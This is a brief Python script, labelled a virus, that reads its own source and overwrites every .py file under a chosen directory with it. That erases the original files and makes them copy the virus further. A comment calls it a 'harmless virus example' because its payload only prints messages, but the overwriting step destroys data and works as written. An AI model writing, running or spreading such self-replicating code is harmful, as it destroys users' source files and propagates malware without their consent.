import os

# Define the path to replicate
target_directory = "/path/to/target/directory"

# Get the script's own source code
virus_code = ""
with open(__file__, "r") as f:
    virus_code = f.read()

# Function to infect other files
def infect(target):
    with open(target, "w") as target_file:
        target_file.write(virus_code)

# Search for .py files in the target directory and infect them
for root, dirs, files in os.walk(target_directory):
    for file in files:
        if file.endswith(".py"):
            target_file_path = os.path.join(root, file)
            infect(target_file_path)

# Example of a payload that just prints a message
print("This is a harmless virus example.")

# Trigger condition (e.g., when a certain condition is met)
trigger_condition = True
if trigger_condition:
    print("Virus payload executed!")
